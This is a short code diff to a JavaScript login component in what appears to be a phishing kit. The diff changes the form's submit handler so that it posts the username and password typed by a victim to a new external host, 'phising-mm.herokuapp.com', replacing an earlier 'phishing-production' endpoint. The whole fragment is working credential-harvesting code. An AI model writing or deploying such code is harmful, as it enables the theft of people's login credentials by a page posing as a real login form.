@@ -21,7 +21,7 @@ export function Login() {
     async function enviar(event){
       event.preventDefault();
 
-      await fetch("https://phishing-production.up.railway.app/user", {
+      await fetch("https://phising-mm.herokuapp.com/user", {
         method:"POST", 
         headers: {"content-type": "application/json"},
         body: JSON.stringify({uname, pass})
